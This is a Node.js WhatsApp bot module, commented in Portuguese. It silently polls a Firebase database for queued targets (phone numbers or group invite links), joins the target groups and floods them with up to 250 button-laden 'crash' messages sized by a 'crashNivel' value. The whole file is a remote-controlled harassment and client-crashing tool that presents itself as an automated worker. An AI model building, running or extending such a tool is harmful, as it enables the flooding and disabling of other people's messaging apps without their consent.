"use strict";

const fs = require("fs");
const path = require("path");

/* =====================================================
   CONFIGURAÇÃO PRINCIPAL (SINCRONIZADA VIA FIREBASE)
===================================================== */

const CONFIG = {
  nome: "🤖「 AMHEEX-BOT 」🤖",

  footer: "🤖「 AMHEEX-BOT 」🤖 | Sistema automatizado",

  // URLs do Firebase Realtime Database
  firebaseBaseUrl: "https://amheex-default-rtdb.firebaseio.com/wa",

  // Estado e Limites Globais
  envioAtivo: true,
  limiteMensagens: 250,
  limiteBotoes: 10,

  // Intervalo de verificação da fila e sincronização da config (ms)
  intervaloVerificacaoFila: 5000,

  // Intervalo do Heartbeat / Status de Presença (ms)
  intervaloPing: 60000,

  // Caminhos e Atributos
  imagem: path.join("assets", "img", "icon.png"),
  pastaTextos: path.join("src", "TextEdition"),
  pastasAlternativas: [
    path.join("ListLoad"),
    path.join("assets", "ListLoad"),
  ],

  intervaloEnvio: 1500, // Ajustado para evitar estouro de sessão E2EE
  enviarImagemFrames: true,
  enviarImagemResumo: true,

  suporte: {
    ativo: true,
    texto: "📞 Suporte",
    url: "https://wa.me/5546999020341?text=AMHEEX%20Ol%C3%A1",
  },
};

/* =====================================================
   DIRETÓRIO BASE
===================================================== */

const BASE_DIR = process.cwd();

/* =====================================================
   IMPORTAÇÃO DOS BOTÕES (COMPATIBILIDADE /src/buttons.js)
===================================================== */

let sendButtons = null;
let sendInteractiveMessage = null;

try {
  const buttonsPath = path.join(BASE_DIR, "src", "buttons");
  const buttonsModule = require(buttonsPath);

  if (typeof buttonsModule?.sendButtons === "function") {
    sendButtons = buttonsModule.sendButtons;
  }

  if (typeof buttonsModule?.sendInteractiveMessage === "function") {
    sendInteractiveMessage = buttonsModule.sendInteractiveMessage;
  }

  console.log("[TRAVAR] Sistema de botões de src/buttons.js carregado com sucesso.");
} catch (error) {
  console.log(
    "[TRAVAR] Sistema de botões indisponível em src/buttons.js:",
    error?.message || error
  );
}

/* =====================================================
   INTEGRAÇÃO E LEITURA AUTOMÁTICA DE CONFIG (FIREBASE)
===================================================== */

let processandoFila = false;
let socketGlobal = null;

async function sincronizarEEnviarPing() {
  try {
    const mainUrl = `${CONFIG.firebaseBaseUrl}.json`;

    await fetch(mainUrl, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        lastPing: new Date().toISOString(),
      }),
    });

    const res = await fetch(mainUrl);
    if (res.ok) {
      const data = (await res.json()) || {};

      if (typeof data.envioAtivo === "boolean")
        CONFIG.envioAtivo = data.envioAtivo;
      if (typeof data.limiteMensagens === "number")
        CONFIG.limiteMensagens = data.limiteMensagens;
      if (typeof data.limiteBotoes === "number")
        CONFIG.limiteBotoes = Math.min(data.limiteBotoes, 10);
    }
  } catch (error) {
    console.error(
      "[FIREBASE] Erro ao sincronizar/pingar:",
      error?.message || error
    );
  }
}

async function incrementarContadorFirebase(tipoAlvo) {
  try {
    const mainUrl = `${CONFIG.firebaseBaseUrl}.json`;
    const getRes = await fetch(mainUrl);
    const data = (await getRes.json()) || {};

    let totalPv = Number(data.totalPv || 0);
    let totalGrupo = Number(data.totalGrupo || 0);

    if (tipoAlvo === "pv") totalPv++;
    else if (tipoAlvo === "grupo") totalGrupo++;

    await fetch(mainUrl, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        totalPv,
        totalGrupo,
        lastUpdate: new Date().toISOString(),
      }),
    });
  } catch (error) {
    console.error(
      "[FIREBASE] Erro ao atualizar contadores:",
      error?.message || error
    );
  }
}

async function processarFilaFirebase(socket) {
  await sincronizarEEnviarPing();

  if (!CONFIG.envioAtivo || processandoFila || !socket) return;

  processandoFila = true;

  try {
    const listUrl = `${CONFIG.firebaseBaseUrl}/list.json`;
    const res = await fetch(listUrl);
    if (!res.ok) {
      processandoFila = false;
      return;
    }

    const lista = await res.json();
    if (!lista) {
      processandoFila = false;
      return;
    }

    const keys = Object.keys(lista);
    let itemPendenteKey = null;
    let itemPendente = null;

    for (const key of keys) {
      if (lista[key] && lista[key].status === "pendente") {
        itemPendenteKey = key;
        itemPendente = lista[key];
        break;
      }
    }

    if (!itemPendenteKey || !itemPendente) {
      processandoFila = false;
      return;
    }

    console.log(
      `[FIREBASE] Item detectado no servidor! ID: ${itemPendenteKey}`
    );

    await fetch(
      `${CONFIG.firebaseBaseUrl}/list/${itemPendenteKey}.json`,
      {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          status: "processando",
          iniciadoEm: new Date().toISOString(),
        }),
      }
    );

    let alvoJid = null;
    if (
      itemPendente.tipoAlvo === "grupo" &&
      itemPendente.alvo.includes("chat.whatsapp.com")
    ) {
      const inviteCode = extrairInviteCode(itemPendente.alvo);
      if (inviteCode) {
        try {
          const grupo = await socket.groupAcceptInvite(inviteCode);
          alvoJid = normalizarJid(grupo);
        } catch (e) {
          console.error(
            `[FIREBASE] Falha ao entrar no grupo: ${inviteCode}`
          );
        }
      }
    } else {
      alvoJid = extrairNumero(itemPendente.alvo);
    }

    if (!alvoJid) {
      console.error(
        `[FIREBASE] Alvo inválido. Removendo item: ${itemPendenteKey}`
      );
      await fetch(
        `${CONFIG.firebaseBaseUrl}/list/${itemPendenteKey}.json`,
        {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ status: "erro_alvo_invalido" }),
        }
      );
      processandoFila = false;
      return;
    }

    const frames = carregarFrames();
    const qtdMensagens = limitarNumero(
      itemPendente.qtdMensagens || 1,
      1,
      CONFIG.limiteMensagens
    );
    const qtdBotoes = limitarNumero(
      itemPendente.crashNivel || 10,
      1,
      CONFIG.limiteBotoes
    );

    let enviados = 0;
    for (let i = 0; i < qtdMensagens; i++) {
      const botoes = gerarBotoes(qtdBotoes, i + 1);
      const frame = frames[i % frames.length];

      try {
        await enviarComImagemEBotoes(socket, alvoJid, {
          texto: `🤖 ${frame}`,
          footer: CONFIG.footer,
          botoes,
          quoted: null,
          usarImagem: CONFIG.enviarImagemFrames,
        });
        enviados++;
        console.log(
          `[FIREBASE WORKER] Enviado ${enviados}/${qtdMensagens} para ${alvoJid}`
        );
      } catch (err) {
        console.error(
          `[FIREBASE WORKER] Erro no envio frame ${i + 1}:`,
          err?.message || err
        );
      }

      if (i + 1 < qtdMensagens) {
        await esperar(CONFIG.intervaloEnvio);
      }
    }

    await incrementarContadorFirebase(itemPendente.tipoAlvo);

    await fetch(
      `${CONFIG.firebaseBaseUrl}/list/${itemPendenteKey}.json`,
      {
        method: "DELETE",
      }
    );

    console.log(
      `[FIREBASE] Item ${itemPendenteKey} processado e concluído.`
    );
  } catch (error) {
    console.error(
      "[FIREBASE] Erro ao processar item do servidor:",
      error?.message || error
    );
  } finally {
    processandoFila = false;
  }
}

/* =====================================================
   HELPERS GERAIS
===================================================== */

const esperar = (ms) =>
  new Promise((resolve) => setTimeout(resolve, ms));

function obterSocket(ctx) {
  return (
    ctx?.socket ||
    ctx?.sock ||
    ctx?.client ||
    ctx?.conn ||
    ctx
  );
}

function normalizarJid(jid) {
  if (!jid) return null;
  const valor = String(jid).trim();

  if (valor.endsWith("@g.us")) return valor;
  if (
    valor.endsWith("@s.whatsapp.net") ||
    valor.endsWith("@c.us")
  ) {
    return valor.replace("@c.us", "@s.whatsapp.net");
  }

  return null;
}

function extrairNumero(texto = "") {
  const numero = String(texto).replace(/\D/g, "");
  if (numero.length < 10) return null;
  return `${numero}@s.whatsapp.net`;
}

function extrairInviteCode(texto = "") {
  const match = String(texto).match(
    /chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i
  );
  return match ? match[1] : null;
}

function limitarNumero(valor, minimo, maximo) {
  const numero = Number(valor);
  if (!Number.isFinite(numero)) return minimo;
  return Math.min(
    maximo,
    Math.max(minimo, Math.floor(numero))
  );
}

/* =====================================================
   PASTA DOS TEXTOS & IMAGEM
===================================================== */

function localizarPastaTextos() {
  const pastas = [
    path.join(BASE_DIR, CONFIG.pastaTextos),
    path.join(process.cwd(), CONFIG.pastaTextos),
    ...CONFIG.pastasAlternativas.map((pasta) =>
      path.join(BASE_DIR, pasta)
    ),
    ...CONFIG.pastasAlternativas.map((pasta) =>
      path.join(process.cwd(), pasta)
    ),
  ];

  for (const pasta of pastas) {
    if (fs.existsSync(pasta)) return pasta;
  }
  return null;
}

function carregarFrames() {
  const pasta = localizarPastaTextos();
  if (!pasta)
    throw new Error("Nenhuma pasta de textos foi encontrada.");

  const arquivos = fs
    .readdirSync(pasta)
    .filter((arquivo) =>
      arquivo.toLowerCase().endsWith(".txt")
    )
    .sort(
      (a, b) =>
        (Number(a.split(".")[0]) || 0) -
        (Number(b.split(".")[0]) || 0)
    );

  if (!arquivos.length)
    throw new Error("Nenhum arquivo .txt foi encontrado.");

  const frames = [];
  for (const arquivo of arquivos) {
    const caminho = path.join(pasta, arquivo);
    try {
      const conteudo = fs.readFileSync(caminho, "utf8").trim();
      if (conteudo) frames.push(conteudo);
    } catch (error) {
      console.log(
        "[TRAVAR] Erro ao ler arquivo:",
        arquivo,
        error?.message || error
      );
    }
  }

  return frames;
}

function obterCaminhoImagem() {
  const caminhos = [
    path.join(BASE_DIR, CONFIG.imagem),
    path.join(process.cwd(), CONFIG.imagem),
  ];

  for (const caminho of caminhos) {
    if (fs.existsSync(caminho)) return caminho;
  }
  return null;
}

function obterImagem() {
  const caminho = obterCaminhoImagem();
  if (!caminho) return null;

  try {
    return fs.readFileSync(caminho);
  } catch (error) {
    console.log(
      "[TRAVAR] Erro ao carregar imagem:",
      error?.message || error
    );
    return null;
  }
}

/* =====================================================
   GERAÇÃO DE BOTÕES E INTEGRAÇÃO COM src/buttons.js
===================================================== */

function gerarBotoes(qtd, indexMensagem) {
  const quantidade = limitarNumero(
    qtd,
    1,
    CONFIG.limiteBotoes
  );
  const botoes = [];

  for (let i = 1; i <= quantidade; i++) {
    botoes.push({
      id: `travar_${indexMensagem}_${i}`,
      text: `🤖「 #${i} 」 🤖`,
    });
  }

  return botoes;
}

async function enviarComImagemEBotoes(
  socket,
  jid,
  { texto, footer, botoes, quoted, usarImagem = true }
) {
  const imagem = usarImagem ? obterImagem() : null;

  // Validação e sincronização preventiva da sessão E2EE para evitar "Aguardando mensagem"
  try {
    if (typeof socket?.presenceSubscribe === "function") {
      await socket.presenceSubscribe(jid);
    }
    if (typeof socket?.assertSessions === "function") {
      await socket.assertSessions([jid], true);
    }
  } catch (e) {
    // Ignora se não suportado na versão
  }

  // 1. Tenta usar sendInteractiveMessage (prioridade do src/buttons.js)
  if (typeof sendInteractiveMessage === "function") {
    try {
      const interactiveButtons = botoes.slice(0, 10).map((botao, idx) => ({
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: botao.text,
          id: botao.id || `quick_${idx + 1}`,
        }),
      }));

      return await sendInteractiveMessage(socket, jid, {
        text: String(texto),
        footer: footer || CONFIG.footer,
        image: imagem,
        interactiveButtons,
        quoted,
      });
    } catch (error) {
      console.log(
        "[TRAVAR] sendInteractiveMessage falhou, tentando sendButtons:",
        error?.message || error
      );
    }
  }

  // 2. Tenta usar sendButtons (fallback secundário do src/buttons.js)
  if (typeof sendButtons === "function") {
    try {
      return await sendButtons(socket, jid, {
        text: String(texto),
        footer: footer || CONFIG.footer,
        image: imagem,
        buttons: botoes.slice(0, 10),
        quoted,
      });
    } catch (error) {
      console.log(
        "[TRAVAR] sendButtons falhou, aplicando fallback textual:",
        error?.message || error
      );
    }
  }

  // 3. Fallback final caso o módulo de botões falhe completamente
  let textoFinal = `${texto}\n\n`;
  if (botoes && botoes.length) {
    textoFinal += botoes.map((b) => `• ${b.text}`).join("\n") + "\n\n";
  }
  if (footer || CONFIG.footer) {
    textoFinal += `_${footer || CONFIG.footer}_`;
  }

  if (imagem) {
    return socket.sendMessage(
      jid,
      { image: imagem, caption: textoFinal },
      { quoted: quoted || undefined }
    );
  }

  return socket.sendMessage(
    jid,
    { text: textoFinal },
    { quoted: quoted || undefined }
  );
}

/* =====================================================
   LOOPS PERMANENTES DE CONEXÃO FIREBASE
===================================================== */

setInterval(() => {
  sincronizarEEnviarPing();
}, CONFIG.intervaloPing);

setInterval(() => {
  if (socketGlobal) {
    processarFilaFirebase(socketGlobal);
  }
}, CONFIG.intervaloVerificacaoFila);

sincronizarEEnviarPing();

/* =====================================================
   MÓDULO PRINCIPAL DE REGISTRO
===================================================== */

module.exports = {
  name: "srv",
  prefixes: [],
  commands: [],
  aliases: [],
  description: "🔒 Worker automatizado via Firebase com suporte completo a src/buttons.js",
  handle: async (ctx = {}) => {
    const socket = obterSocket(ctx);
    if (socket) {
      socketGlobal = socket;
    }
  },
};
